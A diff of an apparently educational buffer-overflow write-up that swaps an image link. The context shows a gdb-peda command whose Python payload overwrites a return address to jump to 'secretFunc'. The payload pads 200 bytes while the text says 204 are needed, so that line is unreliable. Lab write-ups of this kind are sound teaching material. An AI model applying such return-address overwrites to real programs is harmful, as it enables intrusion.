@@ -45,8 +45,7 @@ output:
 $1 = {void ()} 0x804846b <secretFunc>
 ```
 We know the stack frame of the vuln function
-![stack frame](https://ibb.co/c2zNhQx)
-
+![stack-frame](https://github.com/user-attachments/assets/f958d795-a5c0-4699-8f7a-29dbe3fe507e)
 We know the array is 200 bytes long, and ebp is 4 bytes long, so we need to overwrite 204 bytes to reach the return address.
 ```shell script --gdb-peda
 gdb-peda$ r $(python -c 'print "A"*200 + "\x6b\x84\x04\x08"')
